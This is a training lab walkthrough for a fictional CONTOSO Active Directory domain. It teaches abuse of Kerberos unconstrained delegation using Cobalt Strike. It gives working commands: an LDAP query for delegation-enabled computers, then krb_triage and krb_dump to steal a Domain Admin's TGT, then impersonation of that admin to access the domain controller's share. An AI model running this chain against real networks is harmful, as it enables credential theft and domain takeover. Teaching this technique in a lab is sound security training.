

# Introduction



The objective of this lab is to abuse unconstrained delegation to obtain the TGT of a domain administrator.

Log into @lab.VirtualMachine(attacker-desktop).SelectLink with the password ```@lab.VirtualMachine(attacker-desktop).Password```.

## Enumeration

1. [ ] Launch Cobalt Strike and connect to the team server.
2. [ ] Use LDAP to find computers configured for unconstrained delegation.

    ```Beacon-nocolor
    ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName
    ```

	> [!HELP] Domain Controllers always have unconstrained delegation and are not a viable attack path, but you should see an additional machine - *lon-ws-1$*.

1. [ ] Impersonate the *rsteel* user and move laterally to *lon-ws-1*.

	> [!HELP] You should know how to do this from previous labs.

## Exploitation

On the new Beacon on *lon-ws-1*:

1. [] Triage tickets
    1. ```krb_triage```

	> [!HINT] You should see at least one from **dyork@CONTOSO.COM**.

1. [ ] Confirm that dyork is a Domain Admin.
    1. ```ldapsearch samAccountName=dyork --attributes memberOf```

1. [ ] Dump the TGT.
    1. ```krb_dump /user:dyork /service:krbtgt```

1. [ ] Use the TGT to impersonate dyork and list the C$ share on *lon-dc-1*.

	> [!HELP] You should know how to do this from previous labs.



> [!KNOWLEDGE] In this lab, you have learned how to abuse uncontrained delegation to capture the TGT of another user and use it to impersonate them across the network.
